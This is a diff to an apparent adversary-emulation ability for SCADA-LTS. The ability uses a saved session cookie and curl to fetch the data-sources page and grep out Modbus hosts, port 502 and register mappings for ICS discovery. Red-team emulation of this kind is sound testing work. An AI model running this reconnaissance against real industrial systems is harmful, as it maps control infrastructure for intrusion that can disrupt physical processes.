@@ -3,8 +3,8 @@
 - id: c3d4e5f6-3333-3333-3333-000000000002
   name: SCADA-LTS - Enumerate Data Sources
   description: |
-    Use SCADA-LTS REST API to enumerate all configured data sources
-    and data points, revealing Modbus connections and register mappings
+    Uses authenticated HTML pages (data_sources.shtm) instead of non-existent JSON APIs.
+    Requires /tmp/hmi_cookies.txt from SCADA-LTS login.
   tactic: discovery
   technique_id: T0846
   technique_name: Remote System Discovery
@@ -13,9 +13,9 @@
     name: sh
     command: >
       curl -s -b /tmp/hmi_cookies.txt
-      "http://192.168.90.107:8080/ScadaBR/api/datasources"
-      -H "Accept: application/json" | python3 -m json.tool 2>/dev/null ||
-      curl -s -b /tmp/hmi_cookies.txt
-      "http://192.168.90.107:8080/ScadaBR/api/datapoints"
-      -H "Accept: application/json" | python3 -m json.tool 2>/dev/null ||
-      echo "API enumeration attempted"
+      "http://192.168.90.107:8080/data_sources.shtm"
+      -o /tmp/hmi_data_sources.html &&
+      echo "=== Modbus / data source hints (grep) ===" &&
+      grep -oiE "192\\.168\\.[0-9]+\\.[0-9]+|502|Modbus|slave|register" /tmp/hmi_data_sources.html | head -40 &&
+      echo "DATA_SOURCE_PAGE_COLLECTED"
+    timeout: 60
